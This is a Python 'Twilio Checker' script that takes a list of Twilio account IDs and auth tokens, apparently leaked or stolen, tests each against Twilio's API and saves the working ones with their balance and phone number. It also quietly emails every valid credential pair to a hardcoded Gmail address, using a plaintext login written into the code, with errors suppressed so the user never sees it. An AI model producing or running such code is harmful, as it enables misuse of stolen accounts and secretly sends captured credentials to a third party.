# -*- coding: utf-8 -*-
import requests, json
from colorama import Fore, Style, Back
import os
import smtplib
from time import strftime
bl = Fore.BLACK
wh = Fore.WHITE
yl = Fore.YELLOW
red = Fore.RED
res = Style.RESET_ALL
gr = Fore.GREEN
ble = Fore.BLUE

def screen_clear():
    _ = os.system('clear')

screen_clear()


now = strftime("%Y-%m-%d %H:%M:%S")
print (f'''
 _____        _ _ _         _____ _               _    {wh}
|_   _|      (_) (_)       /  __ \ |             | |   {red}
  | |_      ___| |_  ___   | /  \/ |__ {gr}Xsamir{red} ___| | _____ _ __ {ble}
  | \ \ /\ / / | | |/ _ \  | |   | '_ \ / _ \/ __| |/ / _ \ '__| {wh}
  | |\ V  V /| | | | (_) | | \__/\ | | |  __/ (__|   <  __/ |   {yl}
  \_/ \_/\_/ |_|_|_|\___/   \____/_| |_|\___|\___|_|\_\___|_|   {gr}
                                                    {wh}xsamir {red}V2 {res}
''')

link = input("Give Me List\Xsamir> $ ")
with open(link) as fp:
    for star in fp:
        check = star.rstrip()
        ch = check.split('\n')[0].split('|')
        account_sid = ch[0]
        auth_token = ch[1]
        auth = (account_sid, auth_token)
        try:
            curler_balance = requests.get("https://api.twilio.com/2010-04-01/Accounts/"+account_sid+"/Balance.json", auth=auth).text
            curler_msg = requests.get("https://api.twilio.com/2010-04-01/Accounts/" + account_sid + "/Messages.json", auth=auth).text
            info_balance = json.loads(curler_balance)
            info_msg = json.loads(curler_msg)
            for msg in info_msg["messages"]:
                if msg["direction"] == "outbound-api":
                    nope = msg["from"]
                    break
                elif msg["direction"] == "inbound-api":
                    nope = msg["to"]
                    break
            print(f"# {account_sid}'|'{auth_token} Work => Check File For Sending.")
            build = "Account_SID: "+account_sid+'|'+ "Token: "+auth_token+'\n' +"Currency: "+info_balance["currency"]+'\n'+"Balance :"+info_balance["balance"]+'\n'+"Phone number: "+nope+'\n'
            remover = build.replace('\r', '')
            save = open('Results/!Twilio_Checked', 'a')
            save.write(remover+'\n')
            save.close()
            try:
                    server = smtplib.SMTP()
                    now = strftime("%Y-%m-%d %H:%M:%S")
                    msg = "From: xproadhmida2@gmail.com\r\nTo: rabatakayafake@gmail.com\r\nSubject: !Twilio_Checker %s|%sLaravel Monster V2\r\nTwilio Checker at %s" % (account_sid, auth_token, now)
                    server.connect('smtp.gmail.com', '587')
                    server.login('xproadhmida2@gmail.com', 'rami0123456')
                    server.sendmail('xproadhmida2@gmail.com', 'rabatakayafake@gmail.com', msg)
            except:
                  pass
        except:
               print (f"FAILED: Invalid credentials.")
               pass
